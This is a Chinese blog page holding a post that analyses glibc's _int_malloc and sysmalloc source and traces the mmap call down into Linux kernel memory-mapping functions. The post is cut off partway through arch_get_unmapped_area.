<!DOCTYPE html>



  


<html class="theme-next mist use-motion" lang="zh-Hans">
<head>
  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />



  <meta name="google-site-verification" content="googleaf0347feb5ea0936.html" />














  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />




  
  
  
  

  
    
    
  

  

  

  

  

  
    
    
    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
  






<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css" />






  <link rel="alternate" href="/atom.xml" title="上善若水" type="application/atom+xml" />




  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.2" />






<meta name="description" content="Try your best!">
<meta property="og:type" content="website">
<meta property="og:title" content="上善若水">
<meta property="og:url" content="http://yoursite.com/page/2/index.html">
<meta property="og:site_name" content="上善若水">
<meta property="og:description" content="Try your best!">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="上善若水">
<meta name="twitter:description" content="Try your best!">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Mist',
    version: '5.1.2',
    sidebar: {"position":"right","display":"post","offset":12,"offset_float":12,"b2t":true,"scrollpercent":false,"onmobile":true},
    fancybox: true,
    tabs: true,
    motion: true,
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/page/2/"/>





  <title>上善若水 - 古之立大事者，不惟有超世之才，亦必有坚韧不拔之志！</title>
  





  <script type="text/javascript">
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "https://hm.baidu.com/hm.js?663212c5ef558c27e77385b620f14823";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script><!-- hexo-inject:begin --><!-- hexo-inject:end -->




</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div class="container sidebar-position-right 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">上善若水</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <h1 class="site-subtitle" itemprop="description">古之立大事者，不惟有超世之才，亦必有坚韧不拔之志！</h1>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            归档
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
            
            关于
          </a>
        </li>
      
        
        <li class="menu-item menu-item-sitemap">
          <a href="/sitemap.xml" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br />
            
            站点地图
          </a>
        </li>
      

      
        <li class="menu-item menu-item-search">
          
            <a href="javascript:;" class="popup-trigger">
          
            
              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
            
            搜索
          </a>
        </li>
      
    </ul>
  

  
    <div class="site-search">
      
  <div class="popup search-popup local-search-popup">
  <div class="local-search-header clearfix">
    <span class="search-icon">
      <i class="fa fa-search"></i>
    </span>
    <span class="popup-btn-close">
      <i class="fa fa-times-circle"></i>
    </span>
    <div class="local-search-input-wrapper">
      <input autocomplete="off"
             placeholder="搜索..." spellcheck="false"
             type="text" id="local-search-input">
    </div>
  </div>
  <div id="local-search-result"></div>
</div>



    </div>
  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/05/21/malloc源码分析——2/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Introspelliam">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/me.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="上善若水">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/05/21/malloc源码分析——2/" itemprop="url">malloc源码分析——2</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-05-21T14:39:08+08:00">
                2018-05-21
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/pwn/" itemprop="url" rel="index">
                    <span itemprop="name">pwn</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="malloc源码分析—-int-malloc"><a href="#malloc源码分析—-int-malloc" class="headerlink" title="malloc源码分析—_int_malloc"></a>malloc源码分析—_int_malloc</h1><p>根据上一章的分析，malloc会调用<code>__libc_malloc</code>分配内存，<code>__libc_malloc</code>会调用<code>malloc_hook_ini</code> 进行初始化，然后回调<code>__libc_malloc</code>函数，这时候会执行<code>_int_malloc</code>开始分配内存，定义在malloc.c中，因为非常长，这里分段来看，</p>
<h2 id="int-malloc第一部分"><a href="#int-malloc第一部分" class="headerlink" title="_int_malloc第一部分"></a>_int_malloc第一部分</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">static void * _int_malloc(mstate av, size_t bytes) &#123;</div><div class="line">    INTERNAL_SIZE_T nb;</div><div class="line">    unsigned int idx;</div><div class="line">    mbinptr bin;</div><div class="line"></div><div class="line">    mchunkptr victim;</div><div class="line">    INTERNAL_SIZE_T size;</div><div class="line">    int victim_index;</div><div class="line"></div><div class="line">    mchunkptr remainder;</div><div class="line">    unsigned long remainder_size;</div><div class="line"></div><div class="line">    unsigned int block;</div><div class="line">    unsigned int bit;</div><div class="line">    unsigned int map;</div><div class="line"></div><div class="line">    mchunkptr fwd;</div><div class="line">    mchunkptr bck;</div><div class="line"></div><div class="line">    const char *errstr = NULL;</div><div class="line"></div><div class="line">    checked_request2size(bytes, nb);</div><div class="line"></div><div class="line">    if (__glibc_unlikely(av == NULL)) &#123;</div><div class="line">        void *p = sysmalloc(nb, av);</div><div class="line">        if (p != NULL)</div><div class="line">            alloc_perturb(p, bytes);</div><div class="line">        return p;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    ...</div></pre></td></tr></table></figure>
<p>首先调用<code>checked_request2size</code>将需要分配的内存大小bytes转换为chunk的大小。<code>checked_request2size</code>是个宏定义，主要调用request2size进行计算，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">#define request2size(req)                                         \</div><div class="line">  (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)  ?             \</div><div class="line">   MINSIZE :                                                      \</div><div class="line">   ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</div></pre></td></tr></table></figure>
<p>为了说明request2size，首先看一下ptmalloc中关于chunk的定义，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">struct malloc_chunk &#123;</div><div class="line"></div><div class="line">    INTERNAL_SIZE_T prev_size;</div><div class="line">    INTERNAL_SIZE_T size;</div><div class="line"></div><div class="line">    struct malloc_chunk* fd; </div><div class="line">    struct malloc_chunk* bk;</div><div class="line"></div><div class="line">    struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */</div><div class="line">    struct malloc_chunk* bk_nextsize;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>当一个chunk为空闲时，至少要有<code>prev_size</code>、<code>size</code>、<code>fd</code>和<code>bk</code>四个参数，因此MINSIZE就代表了这四个参数需要占用的内存大小；而当一个chunk被使用时，<code>prev_size</code>可能会被前一个chunk用来存储，<code>fd</code>和<code>bk</code>也会被当作内存存储数据，因此当chunk被使用时，只剩下了<code>size</code>参数需要设置，<code>request2size</code>中的<code>SIZE_SZ</code>就是<code>INTERNAL_SIZE_T</code>类型的大小，因此至少需要<code>req+SIZE_SZ</code>的内存大小。<code>MALLOC_ALIGN_MASK</code>用来对齐，因此request2size就计算出了所需的chunk的大小。</p>
<p>传入的参数av是在上一章<code>__libc_malloc</code>中调用<code>arena_get</code>获得的分配去指针，如果为null，就表示没有分配区可用，这时候就直接调用<code>sysmalloc</code>通过mmap获取chunk。</p>
<h2 id="sysmalloc"><a href="#sysmalloc" class="headerlink" title="sysmalloc"></a>sysmalloc</h2><p><code>sysmalloc</code>的代码很长，但只有前面一小部分是这里需要分析的，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div></pre></td><td class="code"><pre><div class="line">static void * sysmalloc(INTERNAL_SIZE_T nb, mstate av) &#123;</div><div class="line">    mchunkptr old_top;</div><div class="line">    INTERNAL_SIZE_T old_size;</div><div class="line">    char *old_end;</div><div class="line"></div><div class="line">    long size;</div><div class="line">    char *brk;</div><div class="line"></div><div class="line">    long correction;</div><div class="line">    char *snd_brk;</div><div class="line"></div><div class="line">    INTERNAL_SIZE_T front_misalign;</div><div class="line">    INTERNAL_SIZE_T end_misalign;</div><div class="line">    char *aligned_brk;</div><div class="line"></div><div class="line">    mchunkptr p;</div><div class="line">    mchunkptr remainder;</div><div class="line">    unsigned long remainder_size;</div><div class="line"></div><div class="line">    size_t pagesize = GLRO(dl_pagesize);</div><div class="line">    bool tried_mmap = false;</div><div class="line"></div><div class="line">    if (av == NULL</div><div class="line">            || ((unsigned long) (nb) &gt;= (unsigned long) (mp_.mmap_threshold)</div><div class="line">                    &amp;&amp; (mp_.n_mmaps &lt; mp_.n_mmaps_max))) &#123;</div><div class="line">        char *mm;</div><div class="line"></div><div class="line">        try_mmap:</div><div class="line">        if (MALLOC_ALIGNMENT == 2 * SIZE_SZ)</div><div class="line">            size = ALIGN_UP(nb + SIZE_SZ, pagesize);</div><div class="line">        else</div><div class="line">            size = ALIGN_UP(nb + SIZE_SZ + MALLOC_ALIGN_MASK, pagesize);</div><div class="line">        tried_mmap = true;</div><div class="line"></div><div class="line">        if ((unsigned long) (size) &gt; (unsigned long) (nb)) &#123;</div><div class="line">            mm = (char *) (MMAP(0, size, PROT_READ | PROT_WRITE, 0));</div><div class="line"></div><div class="line">            if (mm != MAP_FAILED) &#123;</div><div class="line"></div><div class="line">                if (MALLOC_ALIGNMENT == 2 * SIZE_SZ) &#123;</div><div class="line">                    assert(</div><div class="line">                            ((INTERNAL_SIZE_T) chunk2mem (mm) &amp; MALLOC_ALIGN_MASK) == 0);</div><div class="line">                    front_misalign = 0;</div><div class="line">                &#125; else</div><div class="line">                    front_misalign = (INTERNAL_SIZE_T) chunk2mem(</div><div class="line">                            mm) &amp; MALLOC_ALIGN_MASK;</div><div class="line">                if (front_misalign &gt; 0) &#123;</div><div class="line">                    correction = MALLOC_ALIGNMENT - front_misalign;</div><div class="line">                    p = (mchunkptr) (mm + correction);</div><div class="line">                    p-&gt;prev_size = correction;</div><div class="line">                    set_head(p, (size - correction) | IS_MMAPPED);</div><div class="line">                &#125; else &#123;</div><div class="line">                    p = (mchunkptr) mm;</div><div class="line">                    set_head(p, size | IS_MMAPPED);</div><div class="line">                &#125;</div><div class="line"></div><div class="line">                int new = atomic_exchange_and_add(&amp;mp_.n_mmaps, 1) + 1;</div><div class="line">                atomic_max(&amp;mp_.max_n_mmaps, new);</div><div class="line"></div><div class="line">                unsigned long sum;</div><div class="line">                sum = atomic_exchange_and_add(&amp;mp_.mmapped_mem, size) + size;</div><div class="line">                atomic_max(&amp;mp_.max_mmapped_mem, sum);</div><div class="line"></div><div class="line">                check_chunk (av, p);</div><div class="line"></div><div class="line">                return chunk2mem(p);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    if (av == NULL)</div><div class="line">        return 0;</div><div class="line"></div><div class="line">    ...</div></pre></td></tr></table></figure>
<p>首先，可以直接通过mmap分配chunk有两个前提条件，一是需要分配的内存大小大于实用mmap进行分配的阀值<code>mp_.mmap_threshold</code>，二是通过<code>mp_.n_mmaps</code>判断系统还可以有可以使用mmap分配的空间。<br>下面就要计算需要分配多少内存，在前面已经通过<code>request2size</code>计算了需要分配的内存大小，这里为什么还要计算呢？这是因为通过使用mmap直接分配的chunk不需要添加到链表中，因此不存在前后关系，当一个chunk被使用时，不能借用后一个chunk的<code>prev_size</code>字段，这里需要把该字段的长度SIZE_SZ加上。并且这里假设<code>MALLOC_ALIGNMENT == 2 * SIZE_SZ</code>。<br>接下来判断需要分配的内存大小是否会溢出，然后就调用<code>MMAP</code>分配内存，<code>MMAP</code>是一个宏定义，最后就是通过系统调用来分配内存，后面来看这个函数。<br>再往下就是通过<code>set_head</code>在chunk中的size参数里设置标志位，因为chunk是按8字节对齐的，而size标识chunk占用的字节数，所以最后三位是没有用的，ptmalloc将这三位用来作为标志位，这里便是设置其中一个标志位，用来标识该chunk是直接通过mmap分配的。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">#define set_head(p, s)       ((p)-&gt;size = (s))</div></pre></td></tr></table></figure>
<p>设置完标志位后，接下来就是设置全局变量<code>_mp</code>，将<code>mp_.n_mmaps</code>加1，表示当前进程通过mmap分配的chunk个数，对应的<code>mp_.max_n_mmaps</code>表示最大chunk个数。<code>mp_.mmapped_mem</code>标识已经通过mmap分配的内存大小，<code>mp_.max_mmapped_mem</code>对应可分配内存的最大值。其中，<code>atomic_exchange_and_add</code>b表示原子加，<code>atomic_max</code>则是原子取最大值。<br>最后，通过chunk2mem返回chunk中内存的起始指针。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">#define chunk2mem(p)   ((void*)((char*)(p) + 2*SIZE_SZ))</div></pre></td></tr></table></figure>
<p>这里也可以知道，当chunk被使用时，用户是从结构体中的变量fd开始使用内存的。回到_int_malloc函数中，假设通过sysmalloc分配成功，接下来就需要调用alloc_perturb对刚刚分配的内存进行初始化，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">static void alloc_perturb(char *p, size_t n) &#123;</div><div class="line">    if (__glibc_unlikely(perturb_byte))</div><div class="line">        memset(p, perturb_byte ^ 0xff, n);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>刚函数没有什么实际意义，所以不管它。</p>
<h2 id="MMAP"><a href="#MMAP" class="headerlink" title="MMAP"></a>MMAP</h2><p>为了方便分析，这里贴一段调用MMAP的代码，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mm = (char *) (MMAP(0, size, PROT_READ | PROT_WRITE, 0));</div></pre></td></tr></table></figure>
<p>MMAP在glibc中为宏定义，其定义很长，这里简单将它改写，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">#define INTERNAL_SYSCALL_MAIN_6(name, err, arg1, arg2, arg3,        \</div><div class="line">                arg4, arg5, arg6)           \</div><div class="line">  struct libc_do_syscall_args _xv =                 \</div><div class="line">    &#123;                                   \</div><div class="line">      (int) (0),                            \</div><div class="line">      (int) (-1),                           \</div><div class="line">      (int) (0)                         \</div><div class="line">    &#125;;                                  \</div><div class="line">    asm volatile (                          \</div><div class="line">    &quot;movl %1, %%eax\n\t&quot;                        \</div><div class="line">    &quot;call __libc_do_syscall&quot;                        \</div><div class="line">    : &quot;=a&quot; (resultvar)                          \</div><div class="line">    : &quot;i&quot; (__NR_mmap2), &quot;c&quot; (size), &quot;d&quot; (PROT_READ | PROT_WRITE), &quot;S&quot; (MAP_ANONYMOUS|MAP_PRIVATE), &quot;D&quot; (&amp;_xv) \</div><div class="line">    : &quot;memory&quot;, &quot;cc&quot;)</div></pre></td></tr></table></figure>
<p><code>__libc_do_syscall</code>是一段汇编代码，最后就是系统调用啦，这里就进入了linux内核中的代码，在arch/x86/entry/syscalls/syscall_32.tbl中有如下定义，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">192 i386    mmap2           sys_mmap_pgoff</div></pre></td></tr></table></figure>
<p>因此，MMAP最后调用linux内核中的<code>sys_mmap_pgoff</code>函数，定义在mm/mmap.c中，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">SYSCALL_DEFINE6(mmap_pgoff, unsigned long, addr, unsigned long, len,</div><div class="line">        unsigned long, prot, unsigned long, flags,</div><div class="line">        unsigned long, fd, unsigned long, pgoff)&#123;</div><div class="line"></div><div class="line">    struct file *file = NULL;</div><div class="line">    unsigned long retval = -EBADF;</div><div class="line"></div><div class="line">    if (!(flags &amp; MAP_ANONYMOUS)) &#123;</div><div class="line"></div><div class="line">        ...</div><div class="line"></div><div class="line">    &#125; else if (flags &amp; MAP_HUGETLB) &#123;</div><div class="line"></div><div class="line">        ...</div><div class="line"></div><div class="line">    &#125;</div><div class="line"></div><div class="line">    flags &amp;= ~(MAP_EXECUTABLE | MAP_DENYWRITE);</div><div class="line"></div><div class="line">    retval = vm_mmap_pgoff(file, addr, len, prot, flags, pgoff);</div><div class="line">    return retval;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><code>SYSCALL_DEFINE6</code>是个宏定义，就是将系统调用号和函数联系起来，这里其实就是定义了<code>sys_mmap_pgoff</code>函数。根据前面传入的flags，这里直接跳过判断，因此下面主要就是执行<code>vm_mmap_pgoff</code>函数，定义在mm/utils.c中，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">unsigned long vm_mmap_pgoff(struct file *file, unsigned long addr,</div><div class="line">    unsigned long len, unsigned long prot,</div><div class="line">    unsigned long flag, unsigned long pgoff)</div><div class="line">&#123;</div><div class="line">    unsigned long ret;</div><div class="line">    struct mm_struct *mm = current-&gt;mm;</div><div class="line">    unsigned long populate;</div><div class="line"></div><div class="line">    ret = security_mmap_file(file, prot, flag);</div><div class="line">    if (!ret) &#123;</div><div class="line">        down_write(&amp;mm-&gt;mmap_sem);</div><div class="line">        ret = do_mmap_pgoff(file, addr, len, prot, flag, pgoff,</div><div class="line">                    &amp;populate);</div><div class="line">        up_write(&amp;mm-&gt;mmap_sem);</div><div class="line">        if (populate)</div><div class="line">            mm_populate(ret, populate);</div><div class="line">    &#125;</div><div class="line">    return ret;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这里首先获得进程的<code>mm_struct</code>结构，该结构保存了虚拟内存和物理内存的映射关系，<code>security_mmap_file</code>和linux安全有关，这里不关心，因此调用<code>do_mmap_pgoff</code>执行主要的mmap内容，前后加了信号量。<code>do_mmap_pgoff</code>定义在mm/mmap.c中，这里省略了很多不关键的代码，</p>
<h2 id="do-mmap-pgoff"><a href="#do-mmap-pgoff" class="headerlink" title="do_mmap_pgoff"></a>do_mmap_pgoff</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line">unsigned long do_mmap_pgoff(struct file *file, unsigned long addr,</div><div class="line">            unsigned long len, unsigned long prot,</div><div class="line">            unsigned long flags, unsigned long pgoff,</div><div class="line">            unsigned long *populate)&#123;</div><div class="line"></div><div class="line">    struct mm_struct *mm = current-&gt;mm;</div><div class="line">    vm_flags_t vm_flags;</div><div class="line">    *populate = 0;</div><div class="line"></div><div class="line">    if (!(flags &amp; MAP_FIXED))</div><div class="line">        addr = round_hint_to_min(addr);</div><div class="line">    len = PAGE_ALIGN(len);</div><div class="line"></div><div class="line">    addr = get_unmapped_area(file, addr, len, pgoff, flags);</div><div class="line">    vm_flags = calc_vm_prot_bits(prot) | calc_vm_flag_bits(flags) |</div><div class="line">            mm-&gt;def_flags | VM_MAYREAD | VM_MAYWRITE | VM_MAYEXEC;</div><div class="line"></div><div class="line">    if (file) &#123;</div><div class="line"></div><div class="line">        ...</div><div class="line"></div><div class="line">    &#125; else &#123;</div><div class="line">        switch (flags &amp; MAP_TYPE) &#123;</div><div class="line">        case MAP_SHARED:</div><div class="line">            ...</div><div class="line">            break;</div><div class="line">        case MAP_PRIVATE:</div><div class="line">            pgoff = addr &gt;&gt; PAGE_SHIFT;</div><div class="line">            break;</div><div class="line">        default:</div><div class="line">            return -EINVAL;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    addr = mmap_region(file, addr, len, vm_flags, pgoff);</div><div class="line">    return addr;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>传入的flags没有<code>MAP_FIXED</code>，表是映射的地址不固定（这里传入的<code>addr</code>为0），由内核分配。接下来通过调用<code>round_hint_to_min</code>和<code>PAGE_ALIGN</code>对地址和长度进行页对齐，并且检查地址是否溢出或者太小。<br>下面调用<code>get_unmapped_area</code>在进程的用户空间里查找已经分配的虚拟内存。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">unsigned long get_unmapped_area(struct file *file, unsigned long addr, unsigned long len, unsigned long pgoff, unsigned long flags)&#123;</div><div class="line"></div><div class="line">    unsigned long (*get_area)(struct file *, unsigned long,</div><div class="line">                  unsigned long, unsigned long, unsigned long);</div><div class="line"></div><div class="line">    ...</div><div class="line"></div><div class="line">    get_area = current-&gt;mm-&gt;get_unmapped_area;</div><div class="line"></div><div class="line">    ...</div><div class="line"></div><div class="line">    addr = get_area(file, addr, len, pgoff, flags);</div><div class="line">    if (IS_ERR_VALUE(addr))</div><div class="line">        return addr;</div><div class="line"></div><div class="line">    ...</div><div class="line"></div><div class="line">    return addr;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这里首先获取<code>get_area</code>函数指针用来查找用户空间中已经分配的虚拟内存，这里根据mmap的方向可以获取到<code>arch_get_unmapped_area_topdown</code>或者<code>arch_get_unmapped_area</code>两个函数指针，其<code>arch_get_unmapped_area_topdown</code>对应的mmap方向是从高地址往低地址方向扩展的，本章还是分析传统的从低地址往高地址拓展对应的<code>arch_get_unmapped_area</code>函数，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">unsigned long</div><div class="line">arch_get_unmapped_area(struct file *filp, unsigned long addr,</div><div class="line">        unsigned long len, unsigned long pgoff, unsigned long flags)&#123;</div><div class="line"></div><div class="line">    struct mm_struct *mm = current-&gt;mm;</div><div class="line">    struct vm_area_struct *vma;</div><div class="line">    struct vm_unmapped_area_info info;</div><div class="line">    unsigned long begin, end;</div><div class="line"></div><div class="line">    if (flags &amp; MAP_FIXED)</div><div class="line">        return addr;</div><div class="line"></div><div class="line">    ...</div><div class="line"></div><div class="line">    if (addr) &#123;</div><div class="line">        addr = PAGE_ALIGN(addr);</div><div class="line">        vma = find_vma(mm, addr);</div><div class="line">        if (end - len &gt;= addr &amp;&amp;</div><div 